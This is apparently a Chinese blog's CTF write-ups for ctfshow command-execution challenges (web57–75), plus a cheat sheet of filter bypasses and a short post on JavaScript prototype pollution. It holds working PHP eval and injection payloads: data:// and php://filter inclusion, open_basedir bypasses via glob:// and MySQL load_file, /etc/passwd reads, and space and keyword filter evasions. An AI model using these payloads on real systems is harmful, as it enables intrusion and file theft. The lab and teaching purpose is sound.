<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输出 5</span></span><br><span class="line"><span class="built_in">echo</span> $((<span class="number">2</span> + <span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 10 乘以 2 的结果</span></span><br><span class="line"><span class="built_in">echo</span> $((<span class="number">10</span> * <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 10 除以 2 的结果</span></span><br><span class="line"><span class="built_in">echo</span> $((<span class="number">10</span> / <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 10 对 3 取模的结果</span></span><br><span class="line"><span class="built_in">echo</span> $((<span class="number">10</span> % <span class="number">3</span>))</span><br></pre></td></tr></table></figure>
<p>~代表取反</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 以下是更详细的代码示例，对0取反，就是对0的二进制，0进行取反，取反后为-1</span></span><br><span class="line">00000000 00000000 00000000 00000000(假设为32位整数)</span><br><span class="line">取反</span><br><span class="line">11111111 11111111 11111111 11111111</span><br><span class="line"><span class="built_in">echo</span> $((~<span class="number">0</span>))</span><br><span class="line"><span class="comment"># 输出为 -1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 另一个示例，将 5 进行按位取反</span></span><br><span class="line"><span class="built_in">echo</span> $((~<span class="number">5</span>))</span><br><span class="line"><span class="comment"># 先将 5 表示为二进制：00000000 00000000 00000000 00000101</span></span><br><span class="line"><span class="comment"># 取反后：11111111 11111111 11111111 11111010</span></span><br><span class="line"><span class="comment"># 这是 -6 的补码表示，因此输出为 -6</span></span><br></pre></td></tr></table></figure>
<p>算出36</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> $(())</span><br><span class="line"><span class="built_in">echo</span> ---------</span><br><span class="line"><span class="built_in">echo</span> $((~$(())))</span><br><span class="line"><span class="built_in">echo</span> ---------</span><br><span class="line"><span class="built_in">echo</span> $((~$(())+$((~$(())))))</span><br><span class="line"><span class="built_in">echo</span> ---------</span><br><span class="line"><span class="built_in">echo</span> $((~$(())+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))))</span><br><span class="line"><span class="built_in">echo</span> ---------</span><br><span class="line"><span class="built_in">echo</span> $((~$(($((~$(())+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))))))))</span><br><span class="line"><span class="built_in">echo</span> ---------</span><br><span class="line"><span class="built_in">echo</span> $((~$(($((~$(())+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))))))))</span><br><span class="line"></span><br><span class="line">输出后是:</span><br><span class="line">0</span><br><span class="line">---------1</span><br><span class="line">-1</span><br><span class="line">---------2</span><br><span class="line">-2</span><br><span class="line">---------3</span><br><span class="line">-36</span><br><span class="line">---------4</span><br><span class="line">35</span><br><span class="line">---------5</span><br><span class="line">36</span><br></pre></td></tr></table></figure>
<p>那么</p>
<p>?c=$((~$(($((~$(())+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))$((~$(())))+$((~$(())))+$((~$(())))))))))</p>
<p>如果过滤了加号+</p>
<p>?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</p>
<p>ctfshow{3c196564-646f-4120-ae93-1d9f372db21d}</p>
<h1>web58-65</h1>
<p>存在禁用函数，需要各种函数都试试</p>
<p>post</p>
<p>1.c=echo highlight_file(‘flag.php’);<br>
2.c=show_source(“flag.php”);<br>
3.c=highlight_file(“flag.php”);这个应该算是通杀啊，因为在源码就是通过这个函数来显示的，就在else里面highlight_file</p>
<p>4.c=echo file_get_contents(‘flag.php’);</p>
<p>5.c=include(‘flag.php’);echo $flag;</p>
<p>为什么$flag?这是一个变量，相当于我们在java当中int flag = 123456789，然后通过system.out.print(a);打印出来a，也就是123456789这几个赋值给a的数字</p>
<p>之前拿flag不是会进去源码看吗？</p>
<p>里面会有这样的一行代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;a24e6a78-ca48-41ea-8099-904edab2b001&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>6.文件包含相当于咱们学的Java引入一个数据库，然后通过查看什么东西就可以拿到咱们引入的文件的内容</p>
<p>那么我们c=include(‘falg.php’);var_dump(get_defined_vars());</p>
<p>var_dump(get_defined_vars());是拿到所有的注册变量，然后通过var_dump()输出所有变量</p>
<p>7.post里面用一个文件包含，传上去一个a</p>
<p>在url后面加一个?a=php://filter/convert.base64-encode/resource=flag.php</p>
<p><img src="/2025/01/22/web31-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9D%9F/image-20250121202846868.png" alt="image-20250121202846868"></p>
<p>ctfshow{6392df6a-91bd-4704-9398-b7cd00e15aaf}</p>
<p>8.c=rename(‘flag.php’,‘1.txt’)然后进入1.txt查看</p>
<p>9.c=show_source(next(array_reverse(scandir(‘.’))));</p>
<h1>web66</h1>
<p>这题终于不一样了(其实就是flag换地方了)，我们用上述方法找不到flag</p>
<p>我们先扫描目录</p>
<p>c=print_r(scadir(‘/’));</p>
<p>发现flag.txt</p>
<p>c=highlight_file(‘/flag.txt’);</p>
<p>进去</p>
<h1>web67</h1>
<p>这道题用正常思路，不猜flag在那个文件</p>
<p>先扫描目录，发现我们之前用的print_r()函数被禁掉了，用var_dump()函数来代替</p>
<table>
<thead>
<tr>
<th>print_r()输出[name] =&gt; John</th>
</tr>
</thead>
<tbody>
<tr>
<td>var_dump()输出[“name”]=&gt;     string(4) “John”。</td>
</tr>
<tr>
<td><code>var_dump()</code> 更侧重于变量的详细信息，而 <code>print_r()</code> 更侧重于变量的结构和易读性。就如把name的类型打印出来（String类型，4个字符）</td>
</tr>
</tbody>
</table>
<p>c=highlight_file(‘/flag.txt’);</p>
<p>ctfshow{32ceca18-433a-441a-90c3-d9038047ef44}</p>
<h1>web68</h1>
<p>这道题通杀答案highlight_file()被噶了</p>
<p>通过扫描目录，还是在txt里面，应该是变量输出啊应该，要不然以现有知识应该搞不出来</p>
<p>c=include(‘/flag.txt’);这里不用echo，否则flag下面会出现一行报错（不影响我们拿flag）</p>
<p>为什么不用echo？</p>
<p>因为flag.txt里面没有php标签**<code>&lt;?php...?&gt;</code>**，然后我们通过html打开了他，他默认会输出内容</p>
<p>ctfshow{882c2f13-b515-413e-8857-67c1005072f4}</p>
<h1>web69</h1>
<p>这一题var_dump()也被禁掉了，用var_export()代替</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;name&#x27; =&gt; &#x27;John&#x27;</span><br></pre></td></tr></table></figure>
<p>与var_dump的区别就是数组的话用建值来显示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 =&gt; &#x27;reading&#x27;,</span><br></pre></td></tr></table></figure>
<p>c=include(‘/flag.txt’);</p>
<p>ctfshow{2e64a68d-2b05-46ba-9bb6-0df1ea8145b6}</p>
<p>web70</p>
<p>同web69</p>
<p>但是这道题进去的页面提醒我了error_reporting()、ini_set()是不是也可以拿到flag？</p>
<p>然后再插进去一个知识scandir()如果被禁用了，用glob()代替</p>
<p>ctfshow{5b059330-5c9e-43f5-86ce-d8e59c3ee207}</p>
<p>web71</p>
<p>c=var_export(scandir(‘/’));扫描出来个emmm</p>
<p><img src="/2025/01/22/web31-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9D%9F/image-20250121220335830.png" alt="image-20250121220335830"></p>
<p>六百六十六，演都不演了</p>
<p>对了，还给有附件了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Lazzaro</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 22:02:47</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>
<p>ob_get_contents()：得到缓冲区的内容（数据）。<br>
ob_end_clean()：会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。<br>
preg_replace(“/[0-9]|[a-z]/i”,“?”,$s)：把存放缓冲区内容的变量$s的内容都替换为问号。用之前payload发现输出的一大堆问号，就是因为这句话。</p>
<p>方法一：wp:其人之道还之其人之身</p>
<p>c=include(“/flag.txt”);$ss=ob_get_contents();ob_end_clean();echo $ss;</p>
<p>方法二：当执行完eval()之后就结束代码进程</p>
<p>c=include(‘/flag.txt’);exit();</p>
<p>c=include(‘/flag.txt’);die();</p>
<p>ctfshow{d7a57ee7-b124-4ca2-b99d-2fa14ac563d1}</p>
<h1>web72</h1>
<p>源码不变</p>
<p>web71的方法不行了</p>
<p>我们var_export(scandir(‘/’));die();读取不了目录</p>
<p>open_basedir()函数限制了php能够操作的目录，在后面说明了限制在的操作的目录/var/www/html/</p>
<p>这时我们可以用到glob()函数，此函数属于伪协议的一种。</p>
<p>glob伪协议在筛选目录时不受open_basedir制约</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">	# 利用DirectoryIterator($path)可以实现遍历目录下的所有文件</span><br><span class="line">	# glob:// — 查找匹配的文件路径模式</span><br><span class="line">	# DirectoryIterator(&quot;glob:///*&quot;)   遍历根目录里所有文件</span><br><span class="line">foreach($a as $f)</span><br><span class="line">&#123;echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125;exit(0);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>不管了，这道题还需要分析大佬的脚本，贼jb长，老婆娘的裹脚布，又臭又长</p>
<p>web73</p>
<p>正常走流程</p>
<p>知识文件名变了</p>
<p>ctfshow{6020494c-3f4c-42d3-9c23-0b540119fb20}</p>
<p>web74</p>
<p>scandir()被禁用了</p>
<p>c=var_export(glob(‘/*’));die();</p>
<p>c=include(‘/flagx.txt’);die();</p>
<p>web75</p>
<p>利用<code>mysql</code>的<code>load_file</code>读文件，绕过<code>open_basedir</code> 限制。（只限制了PHP的访问目录，不关MYSQL的事情）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=</span><br><span class="line">try &#123;</span><br><span class="line">    $dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">        &#x27;root&#x27;);</span><br><span class="line"> </span><br><span class="line">    foreach ($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row) &#123;</span><br><span class="line">        echo ($row[0]) . &quot;|&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $dbh = null;</span><br><span class="line">&#125; catch (PDOException $e) &#123;</span><br><span class="line">    echo $e-&gt;getMessage();</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>不写了，后面的都太麻烦了，集中一下关键词了</p>
<p>fuzz、</p>
<p>c了，为什么这么不爽，后面这么难，</p>
<h1>总结</h1>
<p>1.<strong>空格绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%09 符号需要php环境</span><br><span class="line"></span><br><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line"></span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line"></span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;flag.txt</span><br><span class="line"></span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line"></span><br><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg</span><br><span class="line"></span><br><span class="line">(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br></pre></td></tr></table></figure>
<p>2.<strong>cat过滤</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line"></span><br><span class="line">less:与 more 类似。但在用 more 时候可能不能向上翻页，不能向上搜索指定字符串，而 less 却可以自由的向上向下翻页，也可以自由的向上向下搜索指定字符串。</span><br><span class="line"></span><br><span class="line">head:查看头几行</span><br><span class="line"></span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line"></span><br><span class="line">tail:查看尾几行</span><br><span class="line"></span><br><span class="line">nl：命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。</span><br><span class="line"></span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line"></span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line"></span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line"></span><br><span class="line">sort:可以查看</span><br><span class="line"></span><br><span class="line">uniq:可以查看</span><br><span class="line"></span><br><span class="line">file -f:报错出具体内容。可以利用报错将文件内容带出来（-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。）</span><br></pre></td></tr></table></figure>
<p>3.<strong>php无需括号的函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 123;</span><br><span class="line"></span><br><span class="line">print 123;</span><br><span class="line"></span><br><span class="line">die;</span><br><span class="line"></span><br><span class="line">include &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">例如?c=include&quot;$_GET[url]&quot;?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">或者?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br><span class="line"></span><br><span class="line">require &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">include_once &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">require_once &quot;etc/passwd&quot;;</span><br></pre></td></tr></table></figure>
<p>4.?&gt;符号相当于和前面的&lt;?php对应了，然后后面的代码会在空间外执行</p>
<ol start="5">
<li></li>
</ol>
<table>
<thead>
<tr>
<th>?c=require$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</th>
</tr>
</thead>
<tbody>
<tr>
<td>和</td>
</tr>
<tr>
<td><strong>?c=require&quot;$_GET[a]&quot;?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</strong></td>
</tr>
<tr>
<td>的区别是：有引号，优先执行</td>
</tr>
</tbody>
</table>
<p>6.文件包含时，如果题目源码当中又出现了一个包含函数(web37)，那么我们可以用data</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(<span class="string">&#x27;cat fla*&#x27;</span>);?&gt;</span><br></pre></td></tr></table></figure>
<p>文件包含相当于咱们学的Java引入一个数据库，然后通过查看什么东西就可以拿到咱们引入的文件的内容</p>
<p>7.如6.当中的代码，如果题目过滤了php，我们可以将&lt;?php换成&lt;?=</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?= system(<span class="string">&#x27;cat fla*&#x27;</span>);?&gt;</span><br></pre></td></tr></table></figure>
<p>或者我们将后面的进行base64编码，不能用cat</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJubCBmbGFnLnBocCAiKTs/Pg==          <span class="comment"># &lt;?php system(&quot;nl flag.php &quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="9">
<li></li>
</ol>
<table>
<thead>
<tr>
<th>localeconv() 函数会返回一个包含本地环境信息的数组</th>
</tr>
</thead>
<tbody>
<tr>
<td>**pos()**和 **current()**是等价的函数，它们会返回数组的当前元素。对于 localeconv()函数返回的数组，使用 pos(localeconv()) 通常会返回该数组的第一个元素的值，如果这个元素是点则返回点，如果是flag则返回flag这四个字符</td>
</tr>
<tr>
<td>**scandir()**函数用于扫描指定目录的文件和目录，由于 pos(localeconv()) 可能返回点，所以 scandir(pos(localeconv())) 等价于scandir(“.”)。</td>
</tr>
<tr>
<td>scandir(“.”)会返回一个包含当前目录下所有文件和目录名称的数组</td>
</tr>
<tr>
<td>**array_reverse()**函数将数组中的元素顺序反转。例如，对于 array(‘.’, ‘…’, ‘index.php’, ‘config.php’, ‘images’)，会变成 array(‘images’, ‘config.php’, ‘index.php’, ‘…’, ‘.’)。</td>
</tr>
<tr>
<td><strong>next(</strong>)函数将数组的内部指针向前移动一个位置，并返回新位置的元素。</td>
</tr>
<tr>
<td>对于 array_reverse(scandir(pos(localeconv()))) 结果，它会跳过第一个元素（例如 images），返回下一个元素（例如 config.php）。</td>
</tr>
<tr>
<td><strong>show_source()</strong> 函数用于显示指定 PHP 文件的源代码，会高亮显示文件内容。</td>
</tr>
</tbody>
</table>
<ol start="10">
<li></li>
</ol>
<p>12.<strong>&gt;/dev/null 2&gt;&amp;1</strong>可以将/dev/null看作&quot;黑洞&quot;. 它非常等价于一个只写文件. 所有写入它的内容都会永远丢失. 而尝试从它那儿读取内容则什么也读不到. 然而, /dev/null对命令行和脚本都非常的有用.</p>
<p>13.命令分割</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;	//分号</span><br><span class="line">|	//只执行后面那条命令</span><br><span class="line">||	//只执行前面那条命令</span><br><span class="line">&amp;	//两条命令都会执行</span><br><span class="line">&amp;&amp;	//两条命令都会执行</span><br></pre></td></tr></table></figure>
<p>14.<strong>空格过滤指过滤了“ ”和“%20”</strong></p>
<p>15.<strong>过滤了数字，但是%09不属于数字</strong>.<code>%09</code> 表示水平制表符（Tab）的编码形式。相当于空格</p>
<p>16.**&lt;&gt;**与html编程有关，这个好像可以弄出来一个空格</p>
<p>17.<strong>反斜杠</strong>\是转义字符。在 <code>fla\g.php</code> 中，可能是试图将 <code>g</code> 转义，使得 <code>fla\g.php</code> 不会被当作一个整体，而被解释为 <code>fla</code> 和 <code>g.php</code>，如果cat被过滤，ca\t可以绕过。</p>
<p>18.**‘’**两个双引号同\一样</p>
<p>19.<strong>grep test *file</strong>在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=grep &#x27;&#x27;&#123;&#x27; flag.php</span><br></pre></td></tr></table></figure>
<p>意思就是在 flag.php匹配到的文件中，查找含有{的文件，并打印出包含 { 的这一行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=grep &#x27;&#x27;ctfshow flag.php</span><br></pre></td></tr></table></figure>
<p>意思就是在 flag.php匹配到的文件中，查找含有{的文件，并打印出包含 ctfshow的这一行</p>
<ol start="20">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=mv fla?.php b.txt</span><br></pre></td></tr></table></figure>
<p>将flag.php移动到b.txt</p>
<p>使用mv时，flag.php将会被删除</p>
<p>21.**bin目录:**bin为binary的简写主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等.web55</p>
<p>22.<strong>/usr/bin目录</strong>:主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome*、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb*、wget等。web55</p>
<p>23.<strong>造一个post上传文件的数据包</strong>web56</p>
<p>24.<strong>算术扩展（Arithmetic Expansion）运算</strong>web57</p>
<p>25.<strong>php标签</strong><code>&lt;?php...?&gt;</code></p>
<p>26.<strong>结束代码进程</strong>exit();die();</p>
]]></content>
      <tags>
        <tag>ctfshow_web_命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>原型链污染</title>
    <url>/2025/03/16/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    <content><![CDATA[<p>似乎与ssti有相似的地方。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&#x27;pan&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = <span class="number">19</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">b = <span class="keyword">new</span> <span class="title function_">a</span>();</span><br><span class="line"><span class="keyword">if</span>(b.<span class="property">__proto__</span> == a.<span class="property"><span class="keyword">prototype</span></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;yes&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;no&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果为yes</span></span><br></pre></td></tr></table></figure>
<h2 id="什么是原型链？">什么是原型链？</h2>
<p>因为继承机制而产生的线性关系</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">__proto__</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">__proto__</span>.<span class="property">__proto__</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*运行结果</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">[Object: null prototype] &#123;&#125;</span></span><br><span class="line"><span class="comment">null</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>var的上层为{}，再上层就是Object，再往上就是null。null为链的末端。</p>
<h2 id="继承机制">继承机制</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&quot;ssz1&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = <span class="number">18</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">b</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&quot;ssz2&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置b的父类为a</span></span><br><span class="line">b.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title function_">a</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义c对象</span></span><br><span class="line">c = <span class="keyword">new</span> b;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`name:<span class="subst">$&#123;c.name&#125;</span> age:<span class="subst">$&#123;c.age&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*运行结果</span></span><br><span class="line"><span class="comment">name:ssz2 age:18</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h2 id="看一个经典的递归漏洞思路">看一个经典的递归漏洞思路</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//漏洞</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//漏洞</span></span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment">//要实现从JSON字符串转换为JS对象，使用 JSON.parse() 方法</span></span><br><span class="line"><span class="comment">//代码中的 __proto__ 是 o1 的上一层原型对象</span></span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"> </span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*运行结果</span></span><br><span class="line"><span class="comment">1 2</span></span><br><span class="line"><span class="comment">2</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>merge(合并)函数解释：用于将source对象的属性合并到target对象中。如果属性是对象，则递归合并，否则直接覆盖或添加属性到target。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let target = &#123; a: 1, b: &#123; x: 2 &#125; &#125;;</span><br><span class="line">let source = &#123; b: &#123; y: 3 &#125;, c: 4 &#125;;</span><br><span class="line">merge(target, source); </span><br><span class="line">// 结果：&#123; a:1, b:&#123;x:2, y:3&#125;, c:4 &#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://zhuanlan.zhihu.com/p/690650551">原文</a></p>
<p><a href="https://xz.aliyun.com/news/12518?time__1311=eqUxu7DtD%3DTND%2FD0Dd%3DitG8RACuWoD&amp;u_atoken=0d51e5d3cd115a0d879fb72d56b21eb7&amp;u_asig=0a47309317419553385443514e0086">python原型链污染</a></p>
]]></content>
      <tags>
        <tag>原型链污染</tag>
      </tags>
  </entry>
  <entry>
    <title>web12-20</title>
    <url>/2025/01/19/web12-20/</url>
    <content><![CDATA[<h1>Web12</h1>
